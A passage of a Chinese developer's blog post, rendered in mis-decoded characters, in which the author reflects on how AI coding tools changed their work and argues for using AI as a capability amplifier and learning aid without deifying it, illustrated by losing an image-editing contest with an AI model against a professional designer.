<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c55aa44285142469bf174b4eb57dc62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=OlPykcKbagAGeD%2B%2BI3ts6vHgbsA%3D" alt="" loading="lazy"/></p>
<p>ç§¯ç´¯å¤šå¹´ï¼Œä¸€åº¦ "<strong>å¼•ä»¥ä¸ºå‚²</strong>" çš„ã€Œ<strong>ç¼–ç¨‹ç»éªŒ</strong>ã€(å¯¹APIçš„ç†Ÿç»ƒç¨‹åº¦ã€å¿«é€Ÿå®šä½BUGçš„ç›´è§‰ã€é…ç½®ç¯å¢ƒçš„ç†Ÿç»ƒåº¦ç­‰) åœ¨ <strong>AI</strong> çš„é¢å‰ï¼Œå˜å¾— "<strong>ä¸å ªä¸€å‡»</strong>"ã€‚æ¸æ¸åœ°ï¼Œæˆ‘çš„ã€Œ<strong>å·¥ä½œæµç¨‹</strong>ã€ä¹Ÿå‘ç”Ÿäº†æ”¹å˜ï¼Œ"<strong>äº²æ‰‹</strong>" æ•²ä¸‹çš„ä»£ç è¶Šæ¥è¶Šå°‘ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ä¸€å¥— "<strong>æœºæ¢°åŒ–</strong>" çš„ "<strong>è‚Œè‚‰è®°å¿†</strong>"ï¼š</p>
<ul>
<li><strong>å†™æ³¨é‡Š</strong> â†’ <strong>ç­‰å¾…AIè¡¥å…¨</strong> â†’ <strong>æŒ‰Tab</strong>ï¼šå“ªæ€•è„‘å­é‡ŒçŸ¥é“ä¸‹ä¸€è¡Œè¯¥å†™ä»€ä¹ˆï¼Œæ‰‹æŒ‡ä¹Ÿä¼šä¸‹æ„è¯†åœé¡¿ï¼Œç­‰å¾…é‚£è¡Œç°è‰²çš„å»ºè®®æµ®ç°ï¼Œç„¶åæ— è„‘æŒ‰ä¸‹ Tabã€‚</li>
<li><strong>æéœ€æ±‚</strong> â†’ <strong>ç”Ÿæˆä»£ç </strong> â†’ <strong>Accept</strong>ï¼šæŠŠä¸šåŠ¡é€»è¾‘æè¿°ä¸€éï¼Œä¸¢ç»™ AIï¼Œéƒ½ä¸å¤ªç»†çœ‹ç”Ÿæˆçš„å…·ä½“å®ç°ï¼Œç›´æ¥ç‚¹å‡» <strong>Accept All</strong>ï¼Œä¸»æ‰“ä¸€ä¸ª "<strong>èƒ½è·‘å°±è¡Œ</strong>"ã€‚</li>
<li><strong>è¿è¡ŒæŠ¥é”™</strong> â†’ <strong>å¤åˆ¶æ—¥å¿—</strong> â†’ <strong>ä¸¢ç»™ AI</strong>ï¼šé‡åˆ° Bugï¼Œç¬¬ä¸€ååº”ä¸å†æ˜¯å»åˆ†æå †æ ˆä¿¡æ¯ (Stack Trace)ï¼Œè€Œæ˜¯CVæ—¥å¿—åˆ°å¯¹è¯æ¡†ï¼Œé—®å®ƒï¼š"è§£å†³æŠ¥é”™ï¼šxxx"ã€‚</li>
<li><strong>æ•ˆæœä¸å¯¹</strong> â†’ <strong>æˆªå›¾</strong> â†’ <strong>ä¸¢ç»™ AI</strong>ï¼šè¿æè¿°é—®é¢˜çš„ç²¾åŠ›éƒ½çœäº†ï¼Œç›´æ¥æˆªå›¾å¾€å¯¹è¯æ¡†é‡Œä¸€æ‰”ï¼Œé™„ä¸Šä¸€å¥ "æ”¹æˆè¿™æ ·"ã€‚</li>
</ul>
<p>ä»£ç è·‘é€šäº†ï¼Œæ•ˆç‡æé«˜äº†ï¼Œå´å¸¦æ¥äº†ç²¾ç¥ä¸Šçš„ã€Œ<strong>ç©ºè™š</strong>ã€ï¼Œæˆ‘ä¼¼ä¹å†ä¹Ÿæ„Ÿå—ä¸åˆ°å½“åˆé‚£ç§ã€Œ<strong>ç¼–ç¨‹çš„å¿«ä¹</strong>ã€ï¼š</p>
<ul>
<li>ä¸ºäº†è§£å†³æŸä¸ªé—®é¢˜ï¼Œè‹¦æ€å†¥æƒ³ï¼ŒæŠ½ä¸å‰¥èŒ§ï¼Œæœ€åæˆåŠŸ "<strong>ç ´æ¡ˆ</strong>" æ—¶ "<strong>å¤šå·´èƒºç–¯ç‹‚åˆ†æ³Œ</strong>" çš„ "<strong>å¿«æ„Ÿ</strong>"ã€‚</li>
<li>æŸ¥å„ç§èµ„æ–™ã€åå¤æ¨æ•²ã€éªŒè¯ï¼Œæœ€ç»ˆè®¾è®¡å‡ºä¸€ä¸ªè‡ªå·±è§‰å¾— "<strong>ç‰›é€¼å“„å“„</strong>" ä»£ç æ¶æ„æ—¶çš„ "<strong>æˆå°±æ„Ÿ</strong>"ã€‚</li>
</ul>
<p>åŒæ—¶ï¼Œä¹Ÿé™·å…¥äº†ä¸€ç§æ·±æ·±çš„ã€Œ<strong>è‡ªæˆ‘æ€€ç–‘ä¸è¿·èŒ«</strong>ã€ï¼š</p>
<ul>
<li>è¶Šæ¥è¶Šæä¸æ¸…æ¥šè‡ªå·±çš„ã€Œ<strong>å®šä½</strong>ã€(å­˜åœ¨ä»·å€¼)ï¼Œä¸Šé¢é‚£å¥— "<strong>è¿æ‹›</strong>" æ‰¾ä¸ªå®ä¹ ç”ŸåŸ¹è®­ä¸¤å¤©ä¹Ÿèƒ½å¹²ã€‚æˆ‘æ›¾èµ–ä»¥ä¸ºç”Ÿçš„é‚£äº› "<strong>æŠ€èƒ½</strong>"ï¼Œæ­£å˜å¾—å»‰ä»·ã€å¯æ›¿ä»£ã€ç”šè‡³æœ‰ç‚¹å¤šä½™ ...</li>
<li><strong>æ‰¾ä¸åˆ°æ–¹å‘</strong>ï¼Œä»¥å‰ã€Œ<strong>ç¨‹åºå‘˜æˆé•¿è·¯å¾„</strong>ã€å¾ˆæ¸…æ™°ï¼š<strong>å­¦è¯­è¨€ â†’ å­¦æ¡†æ¶ â†’ å­¦æ¶æ„ â†’ å­¦ç³»ç»Ÿè®¾è®¡ â†’ åˆ·ç®—æ³• â†’ ææºç </strong> ... åªè¦ä½ ä¸€æ­¥æ­¥å¾€ä¸Šçˆ¬ï¼Œçˆ¬åˆ° "<strong>å±±é¡¶</strong>" å°±èƒ½æˆä¸º "<strong>å¤§ç‰›</strong>"ã€‚è€Œå¦‚ä»Šå´å¥½åƒ "<strong>å¤±æ•ˆ</strong>" äº†...</li>
<li><strong>å¯æ§æ„Ÿè¢«å‰¥å¤º</strong>ï¼Œç¨‹åºå‘˜æ˜¯å…¸å‹çš„ã€Œ<strong>å†…æ§å‹äººæ ¼</strong>ã€â€”â€” ç›¸ä¿¡é€šè¿‡é€»è¾‘å’Œç»†èŠ‚æŒæ§èƒ½é¢„æµ‹ä¸€åˆ‡ã€‚è€Œä½† <strong>AI</strong> çš„ã€Œ<strong>é»‘ç®±ç‰¹æ€§</strong>ã€å¸¦æ¥äº†ã€Œ<strong>å·¥å…·ä¸å¯æ§</strong>ã€ï¼Œæ— æ³•å®Œå…¨å‡†ç¡®é¢„æµ‹AIè¾“å‡ºï¼Œè°ƒè¯•ä» "<strong>è¿½è¸ªé€»è¾‘</strong>" å˜ä¸º "<strong>è¯•æ¢æ¨¡å‹</strong>"ã€‚</li>
</ul>
<h2 data-id="heading-2">3. è°ƒæ•´å¯¹å¾…AIçš„å¿ƒæ€</h2>
<h3 data-id="heading-3">3.1. ä» "ç„¦è™‘" åˆ° "æ¥çº³"</h3>
<p>æˆ‘æ·±çŸ¥ã€Œ<strong>ç„¦è™‘</strong>ã€æ— ç”¨ï¼Œäºæ˜¯å¼€å§‹æ¢å¯»ã€Œ<strong>ç ´å±€ä¹‹é“</strong>ã€ï¼Œåå¤é˜…è¯»å¤§é‡èµ„æ–™åå‘ç°ï¼Œå‡ ä¹æ‰€æœ‰äººéƒ½åœ¨è®©ä½ ã€Œ<strong>æ‹¥æŠ± AI</strong>ã€ï¼Œä½†å…·ä½“æ€ä¹ˆæ‹¥æŠ±æ³•ï¼Ÿæ²¡äººè¯´ï¼Œæˆ–è€…è¯´å¾—å«ç³Šä¸æ¸…ï¼Œæœ‰äº›ç”šè‡³è¿˜æƒ³å‰²æˆ‘ "<strong>éŸ­èœ</strong>" ğŸ¤¡ ï¼Ÿå±è”½è¿™äº›å™ªéŸ³ï¼Œå†·é™ä¸‹æ¥å¤ç›˜ï¼Œæ‹¨å¼€æƒ…ç»ªè¿·é›¾ï¼Œé€è¿‡ç°è±¡çœ‹æœ¬è´¨ã€‚</p>
<p>é¦–å…ˆï¼Œå¦è¯šåœ°ã€Œ<strong>æ¥çº³</strong>ã€è‚¯å®šæ˜¯æ²¡é”™çš„ï¼Œå†å²çš„è½¦è½®ä»ä¸å› ä¸ªäººçš„æ„å¿—è€Œåœæ­¢è½¬åŠ¨ï¼Œå½“ <strong>ç¬¬ä¸€æ¬¡å·¥ä¸šé©å‘½çš„è’¸æ±½æœº</strong> è½°é¸£ä½œå“æ—¶ï¼Œé‚£äº›åšå®ˆæ‰‹å·¥å·¥åœºçš„åŒ äººä»¬ï¼Œä¹Ÿç»å†ç€ç›¸åŒçš„å›°å¢ƒã€‚<strong>ç²¾ç»†æ‰‹è‰º</strong> åœ¨ä¸çŸ¥ç–²å€¦ã€æ•ˆç‡åƒå€çš„ <strong>æœºæ¢°åŒ–å·¥å‚</strong> é¢å‰æ˜¾å¾—è‹ç™½è€Œæ— åŠ›ã€‚å¤§æœºå™¨ç”Ÿäº§å–ä»£æ‰‹å·¥åŠ³åŠ¨ï¼Œä¸æ˜¯ä¸€ç§é€‰æ‹©ï¼Œè€Œæ˜¯ä¸€ç§å¿…ç„¶çš„ "<strong>é™ç»´æ‰“å‡»</strong>"ã€‚</p>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬åŒæ ·ç«™åœ¨äº† "<strong>ç”Ÿäº§åŠ›å˜é©</strong>" çš„å‘¨æœŸèŠ‚ç‚¹ä¸Šï¼Œ "<strong>æ•ˆç‡è‡³ä¸Š</strong>" çš„åº•å±‚é€»è¾‘ä»æœªæ”¹å˜ã€‚æ˜¯é€‰æ‹©æˆä¸ºè¢«æ—¶ä»£ç”©ä¸‹è½¦çš„ "<strong>æ—§æ—¶ä»£çººç»‡å·¥</strong>"ï¼Ÿè¿˜æ˜¯è¿›åŒ–ä¸ºé©¾é©­æœºå™¨çš„ "<strong>æ–°æ—¶ä»£å·¥ç¨‹å¸ˆ</strong>"ï¼Ÿå›å½’ã€Œ<strong>ç¬¬ä¸€æ€§åŸç†</strong>ã€ï¼Œå‰¥å¼€ "<strong>æ™ºèƒ½</strong>" çš„å¤–è¡£ï¼Œæƒ³æƒ³ "<strong>AI çš„æœ¬è´¨æ˜¯ä»€ä¹ˆ?"</strong> â€”â€” ã€Œ<strong>å¹²æ´»çš„å·¥å…·</strong>ã€</p>
<p>æ‰€ä»¥ï¼Œé¢å¯¹ AIï¼Œæˆ‘ä»¬è¦åšçš„äº‹æƒ…å°±æ˜¯ç¢ç£¨ "<strong>å¦‚ä½•ç”¨å¥½è¿™ä¸ªå·¥å…·?</strong> "ï¼Œå³ï¼š<strong>è¯¦ç»†é˜…è¯»ä½¿ç”¨è¯´æ˜åï¼Œåœ¨åˆé€‚çš„åœºæ™¯ï¼Œç”¨åˆé€‚çš„æ–¹å¼ï¼Œè§£å†³åˆé€‚çš„é—®é¢˜ã€‚</strong></p>
<h3 data-id="heading-4">3.2. AI æœ‰ä»€ä¹ˆç”¨ï¼Ÿâ€”â€” èƒ½åŠ›æ”¾å¤§ + è‡ªå­¦åˆ©å™¨</h3>
<h4 data-id="heading-5">3.2.1. èƒ½åŠ›æ”¾å¤§å™¨</h4>
<p>ğŸ¶ ç»å¸¸åœ¨ <strong>è‡ªåª’ä½“å¹³å°</strong> åˆ·åˆ° "<strong>æ™®é€šäººå­¦AIåè‡´å¯Œ/é€†è¢­</strong>" çš„ <strong>å™äº‹</strong>ï¼Œçœ‹åˆ°è¿™äº› "<strong>é€†å¤©æ ‡é¢˜</strong>" æ²¡æŠŠæˆ‘ç¬‘æ­»ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47c99e6777d44036863ee394bb769018~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=XlTPHTLQ%2BPlsFc09y9Zs58k68qg%3D" alt="" loading="lazy"/></p>
<p>å¤šçš„ä¸è¯´ï¼Œè®°ä½è¿™æ®µè¯å°±å¯¹äº†ï¼š</p>
<blockquote>
<p><strong>å˜ç°çš„æ ¸å¿ƒèƒ½åŠ›ä»æ¥ä¸æ˜¯ä½¿ç”¨å·¥å…·ï¼Œè€Œæ˜¯å•†ä¸šè®¤çŸ¥ã€å¸‚åœºæ´å¯Ÿã€è¥é”€æ¨å¹¿ã€å®¢æˆ·æœåŠ¡</strong>ã€‚AI åªæ˜¯ä¸€ä¸ªç¯èŠ‚ï¼Œä¸è¦é«˜ä¼°äº†å·¥å…·çš„ä½œç”¨ï¼Œè€Œä½ä¼°äº† <strong>å•†ä¸šå¸¸è¯†çš„é‡è¦æ€§</strong>ï¼Œä¹Ÿä¸è¦ä½ä¼°äº†èƒŒåçš„ <strong>éšæ€§æˆæœ¬å’Œå·¨å¤§çš„å·¥ä½œé‡</strong>ã€‚</p>
</blockquote>
<p>è¿™äº› "<strong>AIå˜ç°æ•™ç¨‹</strong>" çš„ <strong>æœ€å¤§é—®é¢˜</strong>ï¼š</p>
<blockquote>
<p>è®©ä½ æŠŠAIå½“æˆä¸€ä¸ª ç‹¬ç«‹çš„ã€å…¨æ–°çš„ã€éœ€è¦ä»é›¶å¼€å§‹çš„ "è¡Œä¸š" å»å·ã€‚</p>
</blockquote>
<p>å¯¹äº <strong>99%</strong> çš„æ™®é€šäººè€Œè¨€ï¼ŒæŠŠAIçœ‹ä½œ "<strong>èƒ½åŠ›æ”¾å¤§å™¨</strong>" ä¼šæ›´é è°±ä¸€ç‚¹ï¼Œå³ï¼š</p>
<p><strong>æ€è€ƒå¦‚ä½•åˆ©ç”¨AIï¼Œå¸®æˆ‘æŠŠæˆ‘å·²æœ‰çš„æŠ€èƒ½/å…´è¶£åšå¾—æ›´å¥½ï¼Ÿ</strong></p>
<p>æ¯”å¦‚ï¼š</p>
<ul>
<li>ç”¨ AI å‡å°‘é‡å¤åŠ³åŠ¨ï¼Œæé«˜å·¥ä½œæ•ˆç‡å’Œè´¨é‡ï¼ŒæŠŠæ—¶é—´èŠ±åœ¨æ›´æœ‰åˆ›é€ åŠ›çš„äº‹æƒ…ã€‚</li>
<li>AI è´Ÿè´£å¹¿åº¦ï¼Œä½ è´Ÿè´£æ·±åº¦ï¼Œåœ¨ä½ çƒ­çˆ±çš„å°ä¼—é¢†åŸŸé‡Œç”¨AIæ­¦è£…è‡ªå·±ï¼Œåšåˆ° "äººæ— æˆ‘æœ‰ï¼Œäººæœ‰æˆ‘ç²¾"ã€‚</li>
</ul>
<hr/>
<p>ä»Šå¹´ã€Œ<strong>Vibe Coding (æ°›å›´ç¼–ç¨‹)</strong> ã€å¾ˆç«ï¼š</p>
<blockquote>
<p>ç”¨è‡ªç„¶è¯­è¨€æè¿°æƒ³è¦çš„æ•ˆæœï¼ŒAIå¸®ä½ å†™ä»£ç ï¼Œä½ åªè´Ÿè´£éªŒæ”¶ç»“æœå’Œæä¿®æ”¹æ„è§ï¼Œä¸ç”¨ç®¡å…·ä½“ä»£ç æ€ä¹ˆå®ç°çš„ã€‚</p>
</blockquote>
<p>ç¼–ç¨‹é—¨æ§›å¤§å¤§é™ä½ï¼Œ<strong>æ™®é€šäºº</strong> åªè¦èƒ½æŠŠ <strong>åˆ›æ„å’Œæ„Ÿè§‰</strong> ç¿»è¯‘æˆéœ€æ±‚ï¼Œå°±èƒ½å€ŸåŠ© <strong>AI</strong> å°†å…¶å¿«é€Ÿå…·è±¡åŒ–ä¸º <strong>å¯è¿è¡Œçš„äº§å“</strong>ã€‚</p>
<p>ä½†ä½ ä¼šå‘ç°ï¼Œç»å¤§å¤šæ•°ç”Ÿæˆçš„ä½œå“éƒ½æ˜¯ "<strong>ä¸€æ¬¡æ€§åŸå‹æˆ–ç©å…·</strong>"ï¼šçµå…‰ä¸€ç°å³å¯å®ç°ï¼Œå´ç¼ºä¹æŒç»­è¿­ä»£ã€æ¶æ„è®¾è®¡ä¸ç”¨æˆ·éªŒè¯ï¼Œå› æ­¤éš¾ä»¥å…·å¤‡å•†ä¸šä»·å€¼ã€ä¹Ÿéš¾å½¢æˆå¯æŒç»­çš„äº§å“å½¢æ€ã€‚</p>
<p>çœŸæ­£èƒ½å¤Ÿåˆ©ç”¨ <strong>Vibe Coding</strong> å®ç°å˜ç°çš„ï¼Œå¾€å¾€æ˜¯å…·å¤‡ä¸€å®š <strong>ç¼–ç¨‹ç»éªŒ</strong> æˆ– <strong>äº§å“æ€ç»´</strong> çš„ "<strong>ä¸“ä¸šäººå£«</strong>"ã€‚ä»–ä»¬ä¸ä»…èƒ½ç”¨ <strong>AI</strong> å¿«é€Ÿå®ç°çµæ„Ÿï¼Œè¿˜èƒ½å¯¹ä½œå“è¿›è¡ŒæŒç»­ä¼˜åŒ–ã€è¿­ä»£å’Œå·¥ç¨‹åŒ–æ‰“ç£¨ï¼Œä»è€Œå°† "<strong>çµæ„ŸåŸå‹</strong>" è¿›åŒ–ä¸º "<strong>å¯ç”¨äº§å“</strong>"ã€‚</p>
<p>å†è¯´ä¸€ä¸ªè‡ªå·±è§‚å¯Ÿåˆ°çš„ä¾‹å­ï¼Œå‰é˜µå­ <strong>OpenAI</strong> å‘å¸ƒäº†ç”¨äºç”ŸæˆçŸ­è§†é¢‘çš„ã€Œ<strong>Sora2</strong>ã€ï¼Œ<strong>Bç«™</strong> å¾ˆå¿«æ¶Œç°äº†ä¸€å † <strong>AI</strong> ç”Ÿæˆçš„ "<strong>èµ›åšç§‘æ¯”</strong>" æ¶æè§†é¢‘ã€‚</p>
<p>çœ‹åˆ°ä¸€ä¸ªæ’­æ”¾é‡ç ´ç™¾ä¸‡çš„ä½œå“æœ‰ç‚¹æ„æ€ï¼Œç‚¹è¿› UP ä¸»çš„ä¸»é¡µæƒ³çœ‹ä¸‹å…¶å®ƒä½œå“ï¼Œç»“æœå‘ç°ä»–å¹¶ä¸æ˜¯çªç„¶çˆ†ç«çš„ "<strong>æ–°äºº</strong>"ï¼Œäººå®¶å·²ç»é»˜é»˜åšäº†å¥½å‡ å¹´è§†é¢‘ï¼Œåªæ˜¯è¿‡å»çš„æ’­æ”¾é‡æƒ¨æ·¡ (å‡ åå‡ ç™¾)ã€‚ä½†ä»–å´ä¸€ç›´åšæŒåˆ›ä½œï¼Œå°è¯•ä¸åŒçš„æ–¹å‘ï¼Œèƒ½æ¸…æ™°åœ°çœ‹åˆ°ä»–çš„å‰ªè¾‘ã€å™äº‹å’Œæ•´ä½“åˆ¶ä½œæ°´å¹³åœ¨ä¸€ç‚¹ç‚¹æé«˜ã€‚</p>
<blockquote>
<p><strong>AI ä¸ä¼šè®©æ²¡æœ‰ç§¯ç´¯çš„äºº"å¹³åœ°èµ·é£"ï¼Œä½†æœ‰å¯èƒ½è®©æœ‰å‡†å¤‡çš„äºº"ä¸€é£å†²å¤©"ã€‚â€”ã€ŠæŠ è…šç”·å­©ã€‹</strong></p>
</blockquote>
<h4 data-id="heading-6">3.2.2. è‡ªå­¦åˆ©å™¨</h4>
<p>çœ‹åˆ°è¿™é‡Œï¼Œå¯èƒ½æœ‰äººä¼šé—®ï¼š</p>
<blockquote>
<p>"<strong>é‚£æ™®é€šäººæ€ä¹ˆåŠï¼Ÿæˆ‘æ²¡å•¥ä¸“ä¸šæŠ€èƒ½ï¼Œä¹Ÿæ²¡æœ‰é•¿æœŸç§¯ç´¯å•Šï¼Ÿ</strong> "</p>
</blockquote>
<p>ç®€å•ï¼Œé‚£å°± "<strong>å­¦</strong>" å•Šï¼ï¼ï¼ä»¥å‰å­¦ä¹ çš„æœ€å¤§é™åˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<blockquote>
<p><strong>æ²¡äººæ•™ã€æ•™ä¸å¥½ã€å­¦ä¸åŠ¨ã€åšæŒéš¾</strong></p>
</blockquote>
<p>è€Œç°åœ¨ï¼Œä½ æœ‰äº†ä¸€ä¸ªã€Œ<strong>å…¨çŸ¥å…¨èƒ½ã€çŸ¥æ— ä¸è¨€ã€24å°æ—¶ä¸ºä½ æœåŠ¡çš„å…è´¹è€å¸ˆ</strong>ã€</p>
<ul>
<li>ä¸ä¼šå†™ä»£ç ï¼Ÿæ‰‹æŠŠæ‰‹æ•™ä½ ï¼Œä»é€»è¾‘åˆ°ç¤ºä¾‹ä¸€æ­¥æ­¥æ‹†å¼€ã€‚</li>
<li>æƒ³è½¬è¡Œï¼Ÿç»™ä½ è·¯å¾„ã€èµ„æºã€ç»ƒä¹ æ¸…å•ã€å¤ç›˜å»ºè®®ã€‚</li>
<li>æƒ³è·¨é¢†åŸŸï¼Ÿå¸®ä½ å»ºç«‹çŸ¥è¯†æ¡†æ¶ï¼ŒæŠŠé™Œç”Ÿé¢†åŸŸæœ€éš¾å•ƒçš„éƒ¨åˆ†å˜ç®€å•ã€‚</li>
<li>é‡åˆ°ç“¶é¢ˆï¼Ÿåƒä¸€å¯¹ä¸€å¯¼å¸ˆä¸€æ ·ä¸æ–­æé—®ã€å¼•å¯¼ã€çº åã€‚</li>
</ul>
<p>å½“ç„¶ï¼Œæƒ³è¦è¿™å° "<strong>è‡ªå­¦åˆ©å™¨</strong>" é«˜æ•ˆè¿è½¬èµ·æ¥ï¼Œå®ç° <strong>å¿«é€Ÿå­¦ä¹ /è¯•é”™/è·¨åŸŸ</strong> è¿˜éœ€è¦æŒæ¡ä¸€äº› <strong>æ–¹æ³•è®º</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8ab4f26154f45938b7a854a3a91745f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=B4NtXwx%2FivfApL08OZdrvEIT37U%3D" alt="" loading="lazy"/></p>
<p>è¯¦ç»†è§£è¯»å¯ä»¥å‚åŠ æˆ‘ä¹‹å‰å†™çš„<a href="https://juejin.cn/post/7540494849926234175" target="_blank" title="https://juejin.cn/post/7540494849926234175">ã€Šå¦‚ä½•å€ŸåŠ©AIï¼Œé«˜æ•ˆå­¦ä¹ ï¼Œå®ç°å¿«é€Ÿ"è·¨åŸŸ"ã€‹</a></p>
<h4 data-id="heading-7">3.2.3. ä¸è¦ç¥åŒ– AI</h4>
<p>ğŸ¶ 2333ï¼Œç»å¸¸åˆ·åˆ° "xxå…¬å¸å‘å¸ƒæ–°çš„ xx æ¨¡å‹/AIäº§å“é¢ è¦†è¡Œä¸šï¼Œxxå¸ˆè¦å¤±ä¸šäº†" çš„æ ‡é¢˜ï¼Œ<strong>ä½†äº‹å®çœŸçš„å¦‚æ­¤å—</strong>ï¼Ÿæœ€è¿‘ <strong>Google</strong> å®¶çš„ <strong>Nano Banana Pro</strong> ğŸŒå¾ˆç«ï¼Œå·ç§°å½“å‰ "<strong>æœ€å¼ºAIç”Ÿå›¾</strong>" æ¨¡å‹ï¼Œäº²èº«ä½“éªŒä¸‹ç¡®å®å¼º (æœ¬æ–‡å¤§éƒ¨åˆ†é…å›¾å°±æ˜¯å®ƒå‡ºçš„)ï¼Œå¤©å¤©åœ¨ç¾¤é‡Œå¹çˆ†ã€‚</p>
<p>æŸå¤©æ™šä¸Šï¼Œæœ‰ "<strong>å¤šå¹´ä¸“ä¸šè®¾è®¡ç»éªŒ</strong>" çš„è€å©†æ”¶åˆ°ä¸€ä¸ªæ”¹å›¾éœ€æ±‚ (æŠ ç´ æï¼ŒæŒ‰è¦æ±‚è°ƒæ•´æµ·æŠ¥)ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad98cdf593194a0bbeb0eed40851608b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=6nx1EbLSDrWXWMGuHsmi1kzIlg0%3D" alt="" loading="lazy"/></p>
<p>ğŸ˜„ çœ‹ç€ç®€å•ï¼Œæ„Ÿè§‰ ğŸŒ å°±èƒ½åšï¼Œäºæ˜¯æˆ‘æå‡ºå’Œè€å©† <strong>PK</strong> ä¸‹ï¼Œå¥¹ç”¨ <strong>PS</strong> æ”¹ï¼Œæˆ‘ç”¨ ğŸŒ <strong>å˜´éä¿®å›¾</strong>ï¼Œçœ‹è°å‡ºçš„å›¾åˆå¿«åˆå¥½ã€‚ç»“æœï¼šå¥¹10åˆ†é’Ÿä¸åˆ°å°±æ”¹å®Œï¼Œè€Œæˆ‘è·Ÿ ğŸŒ Battleäº†åŠä¸ªå°æ—¶æ²¡æå¥½ï¼Œæœ€ç»ˆçš„æ•ˆæœå›¾ (å·¦è¾¹å¥¹çš„ï¼Œå³è¾¹æˆ‘çš„)ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c13fac697044fb9b40f393f36a55ccb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=OpodSHVH7Fbo6crw0PFdysLRjtE%3D" alt="" loading="lazy"/></p>
<p>ğŸ¤¡ "<strong>ç”²æ–¹</strong>" çš„è¯„ä»· (ç ´å¤§é˜²äº†ğŸ˜­)ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3eca9b68f6f4a9db9c8c6fc12e0365b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=u6zQT8eSZAsDS7xHMqGwvu3R6uw%3D" alt="" loading="lazy"/></p>
<p>è§‚å¯Ÿä»”ç»†çš„è¯»è€…å¯èƒ½ä¼šé—®ï¼š"ä½ æ˜¯ä¸æ˜¯æ¼äº†ä¸€ä¸ªè½¦ğŸš—å•Šï¼Ÿ"ï¼Œæ†‹è¯´äº†ï¼Œè¿™ç ´è½¦æŠŠæˆ‘è°ƒéº»äº†...</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52ced4658b3542139f9288f3b6cd9f13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=NfDUnFftBY%2FZar837qeM6vb3pmo%3D" alt="" loading="lazy"/></p>
<p>é‚£ä¸€åˆ»ï¼Œæˆ‘æ·±åˆ»ä½“ä¼šåˆ°äº†ä»€ä¹ˆå« "<strong>ä¸è¦æ‹¿ä½ çš„å…´è¶£çˆ±å¥½ï¼Œå»æŒ‘æˆ˜åˆ«äººçš„é¥­ç¢—</strong>"ï¼ŒçœŸçš„æ˜¯ "<strong>é™ç»´æ‰“å‡»</strong>" å•Šï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/015c56793b924d0a98327e4b02a0a8e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=mPcBFO9zxw7uISCSpvW5WK1PoM4%3D" alt="" loading="lazy"/></p>
<blockquote>
<p><strong>AI</strong> ç¡®å®æ‹‰ä½äº†åˆ›ä½œçš„é—¨æ§›ï¼Œä½†ç›®å‰è¿˜å¤„äºç”Ÿæˆ <strong>80åˆ†</strong> å†…å®¹çš„é˜¶æ®µ (æ•ˆç‡)ï¼Œæœ€åçš„ <strong>10-20</strong> åˆ† (ç»†èŠ‚ã€å®¡ç¾ã€æƒ…æ„Ÿ) æ‰æ˜¯ä»·å€¼çš„æ ¸å¿ƒã€‚â€”â€”ã€ŠæŠ è…šç”·å­©ã€‹</p>
</blockquote>
<p>åé¢å¤ç›˜ï¼Œè€å©†çœ‹äº†ä¸‹æˆ‘çš„ <strong>Prompt</strong>ï¼Œè¯´æˆ‘çš„æµç¨‹æœ‰ç‚¹é—®é¢˜ï¼Œåº”è¯¥è®© <strong>AI</strong> å…ˆæŠŠç´ æå…¨æŠ å‡ºæ¥å…ˆï¼Œå†æ…¢æ…¢ç»„åˆã€‚åé¢è¯•äº†ä¸‹ï¼Œæ•ˆæœç¡®å®æœ‰å¥½ä¸€äº›ã€‚ä¸è¿‡ï¼Œä¸å¾—ä¸è¯´ï¼Œ<strong>AI</strong> åœ¨ <strong>è‡ªåŠ¨æŠ å›¾</strong> è¿™å—ç¡®å®å¯ä»¥ï¼š</p>
